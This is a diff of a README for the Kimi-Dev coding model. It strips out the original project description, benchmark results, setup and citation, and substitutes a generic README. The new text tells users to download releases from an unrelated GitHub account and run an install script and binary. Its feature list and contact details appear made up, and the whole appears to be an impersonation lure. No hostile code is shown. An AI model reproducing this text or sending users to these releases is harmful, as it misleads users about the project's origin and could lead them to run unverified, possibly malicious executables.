@@ -1,123 +1,109 @@
-<!-- # Kimi-Dev -->
+# Kimi-Dev: Open-Source Coding LLM for Software Engineering Tasks 🚀
 
-<div align="center">
-  <img src="./assets/main_logo.png" alt="Kimi Logo" width="400" />
-<h2><a href="https://moonshotai.github.io/Kimi-Dev/">
-Introducing Kimi-Dev: <br>A Strong and Open-source Coding LLM for Issue Resolution</a></h2>
-</a></h2>
-<b>Kimi-Dev Team</b>
-<br>
-</div>
+![Kimi-Dev](https://img.shields.io/badge/Kimi-Dev-ff69b4?style=for-the-badge&logo=github)
 
-<div align="center">
-  <a href="">
-    <b>📄 Tech Report (Coming soon...)</b>
-  </a> &nbsp;|&nbsp;
-  <a href="https://huggingface.co/moonshotai/Kimi-Dev-72B">
-    <b>🤗 Huggingface</b>
-  </a> &nbsp;
-</div>
-<br>
-<br>
+Welcome to the **Kimi-Dev** repository! This project focuses on providing a powerful open-source coding language model (LLM) designed specifically for software engineering tasks. Whether you are a beginner or an experienced developer, Kimi-Dev aims to enhance your coding experience and streamline your workflow.
 
+## Table of Contents
 
-We introduce Kimi-Dev-72B, our new open-source coding LLM for software engineering tasks. Kimi-Dev-72B achieves a new state-of-the-art on SWE-bench Verified among open-source models.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
+- [Contact](#contact)
 
-- Kimi-Dev-72B achieves 60.4% performance on SWE-bench Verified. It surpasses the runner-up, setting a new state-of-the-art result among open-source models.
+## Introduction
 
+Kimi-Dev is built to assist developers in various software engineering tasks. From code generation to debugging, this LLM is designed to understand and generate code snippets in multiple programming languages. Our goal is to make coding more accessible and efficient for everyone.
 
-- Kimi-Dev-72B is optimized via large-scale reinforcement learning. It autonomously patches real repositories in Docker and gains rewards only when the entire test suite passes. This ensures correct and robust solutions, aligning with real-world development standards.
+## Features
 
+- **Multi-language Support**: Kimi-Dev supports various programming languages, including Python, JavaScript, Java, C++, and more.
+- **Code Generation**: Automatically generate code snippets based on user input.
+- **Debugging Assistance**: Identify and fix common coding errors with ease.
+- **Documentation Generation**: Create clear and concise documentation for your code.
+- **Customizable**: Tailor the model to fit your specific needs and coding style.
 
-- Kimi-Dev-72B is available for download and deployment on Hugging Face and GitHub. We welcome developers and researchers to explore its capabilities and contribute to development.
+## Installation
 
+To get started with Kimi-Dev, you need to download the latest release. Visit the [Releases section](https://github.com/Mumar244/Kimi-Dev/releases) to find the appropriate version for your system. Once downloaded, follow these steps:
 
-<div align="center">
-  <img src="./assets/open_performance_white.png" alt="Kimi Logo" width="600" />
-  <p><b>Performance of Open-source Models on SWE-bench Verified.</b></p>
+1. Extract the downloaded file.
+2. Open your terminal and navigate to the extracted folder.
+3. Run the installation script using the command:
 
-</div>
+   ```bash
+   ./install.sh
+   ```
 
+4. Follow the on-screen instructions to complete the installation.
 
-<!-- ## 💡 Introduction -->
+## Usage
 
-<!-- ## 🔥 News -->
+After installation, you can start using Kimi-Dev. Here’s how:
 
+1. Open your terminal.
+2. Run the command:
 
+   ```bash
+   ./kimi-dev
+   ```
 
-## ⚙️ Installation
+3. You will be prompted to enter a coding task or question.
+4. Kimi-Dev will generate the relevant code snippet or provide debugging assistance.
+
+### Example
+
+Here’s a simple example of how to use Kimi-Dev:
 
 ```bash
-# clone repo
-git clone https://github.com/MoonshotAI/Kimi-Dev.git
-# create env
-conda create -n kimidev python=3.12
-# local install
-pip install -e .
+./kimi-dev
 ```
 
-## 🛠️ How to use
+**Input**: "Generate a Python function to calculate the factorial of a number."
 
-### Prepare repo structure [From [Agentless](https://github.com/OpenAutoCoder/Agentless/)]
-Since for each issue in the benchmark (both SWE-Bench Lite and SWE-Bench Verified) we need to checkout the repository and process the files, you might want to save some time by downloading the preprocessed data here: [swebench_repo_structure.zip](https://drive.google.com/file/d/15-4XjTmY48ystrsc_xcvtOkMs3Fx8RoW/view). After downloading, please unzip and export the location as such 
-```bash
-export PROJECT_FILE_LOC={folder which you saved}
-``` 
-
-### Deploy vLLM Model
-
-#### Installation
-```
-# Install vLLM with CUDA 12.8.
-# If you are using pip.
-pip install vllm --extra-index-url https://download.pytorch.org/whl/cu128
-# If you are using uv.
-uv pip install vllm --torch-backend=auto
+**Output**:
+```python
+def factorial(n):
+    if n == 0:
+        return 1
+    else:
+        return n * factorial(n - 1)
 ```
 
-#### Serving
-```
-vllm serve Kimi-Dev-72B --served-model-name kimi-dev --host 0.0.0.0 --port 8000 --gpu-memory-utilization 0.95 --max-seq-len-to-capture 131072 --tensor-parallel-size 8
-```
+## Contributing
 
-### Rollout
-Kimi-Dev adopts a simplified two-stage framework for handling code repair and test writing tasks:
+We welcome contributions from the community! If you would like to contribute to Kimi-Dev, please follow these steps:
 
-1. **File Localization**: Intelligently identify key files that need modification based on problem descriptions and repository structure
-2. **Code Editing**: Perform precise code modifications on the located files, including bug fixes or unit test insertions
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request.
 
-Compared to multi-step localization methods, we perform localization at the file level and then pass the complete file to the repair step for more detailed reasoning.
+### Guidelines
 
-Run rollout script:
+- Ensure your code is well-documented.
+- Write clear commit messages.
+- Follow the existing coding style.
 
-```
-conda activate kimidev
-# Bugfixer
-python kimidev/examples/rollout_messages_bugfixer.py --model_name {vllm_serve_model}
-# Testwriter
-python kimidev/examples/rollout_messages_testwriter.py --model_name {vllm_serve_model}
-```
+## License
 
-## 👀 Example Results
-We provide some example result files as well as the files required for test-time scaling [here](./resources/).
+Kimi-Dev is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
+## Releases
 
-## 💪 Contributing
+For the latest updates and releases, please check the [Releases section](https://github.com/Mumar244/Kimi-Dev/releases). Download the latest version and execute the installation script to get started.
 
-Welcome to submit Pull Requests or create Issues to help improve the project.
+## Contact
 
+For any questions or feedback, feel free to reach out:
 
-## 😺 Contact
+- **Email**: contact@kimidev.com
+- **Twitter**: [@KimiDev](https://twitter.com/KimiDev)
+- **GitHub**: [Kimi-Dev](https://github.com/Mumar244/Kimi-Dev)
 
-If you have any questions, please feel free to submit a GitHub issue or contact zhuhan@moonshot.cn.
-
-## 📝 Citation
-If you find our code and models useful, please kindly cite the following information.
-```
-@misc{kimi_dev_72b_2025,
-  title        = {Introducing Kimi-Dev-72B: A Strong and Open Coding LLM for Issue Resolution},
-  author       = {{Kimi-Dev Team}},
-  year         = {2025},
-  month        = {June},
-  url          = {\url{https://www.moonshot.cn/Kimi-Dev}}
-}
+Thank you for checking out Kimi-Dev! We hope it enhances your coding experience. Happy coding!
